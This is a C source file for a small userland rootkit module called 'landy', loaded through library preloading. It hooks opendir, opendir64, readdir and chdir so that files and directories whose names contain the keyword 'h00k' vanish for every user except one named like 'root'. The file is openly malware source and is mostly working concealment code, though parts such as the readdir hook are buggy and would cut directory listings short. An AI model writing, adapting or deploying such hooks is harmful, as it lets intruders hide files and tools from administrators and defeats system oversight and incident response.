#define _GNU_SOURCE
/*
*@@@ landy @@@
*Hooks system calls to hide files using a keyword
*
*/
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <errno.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

#define keyword "h00k"
#define permission "root"


//directory stuff
DIR *(*old_opendir)(const char *name);
DIR *(*old_opendir64)(const char *name);
struct dirent *(*old_readdir)(DIR *dirp);
int *(*old_chdir)(const char *path);
int *(*old_fchdir)(int fd);



int ismaster(){
    //TODO find a good way to verify that master is master
   struct passwd *user = getpwuid(getuid());
   
   if(strstr(user->pw_name,permission)){
	return 0;
    }

    return 1;

}

//hook the opendir function
DIR *opendir(const char *name){
    
    if(!old_opendir){
	old_opendir = dlsym(RTLD_NEXT,"opendir");
    }

    if(ismaster() != 0){
	if(strstr(name,keyword)){
	    errno = EIO;
	    return NULL;
	}
    }

    return old_opendir(name);
}

DIR *opendir64(const char *name){
    if(!old_opendir64){
	old_opendir64 = dlsym(RTLD_NEXT,"opendir64");
    }
   
    if(ismaster() != 0){
	if(strstr(name,keyword)){
	    errno = EIO;
	    return NULL;
	}
    }

    return old_opendir64(name);

}

struct dirent *readdir(DIR *dirp){
  
    struct dirent *dir;

    if(!old_readdir){
	old_readdir = dlsym(RTLD_NEXT,"readdir");
    }
    
    dir = old_readdir(dirp);
    
    //is user allowed to see these juicy files?
    if(ismaster() == 0){
	return dir;
    }
    

    //hides via keyword. Needs more testing
    if(strstr(dir->d_name,keyword)) return 0;

    //printf("hit\n");
    return dir;

}

int chdir(const char *path){
    
    if(!old_chdir){
	old_chdir = dlsym(RTLD_NEXT,"chdir");
    }

    if(ismaster() != 0){
	if(strstr(path,keyword)){
	    errno = EIO;
	    return -1;
	}
    }

    return old_chdir(path);

}

int fchdir(int fd){
    
    if(!old_fchdir){
	old_fchdir = dlsym(RTLD_NEXT,"fchdir");
    }

    return old_fchdir(fd);

}



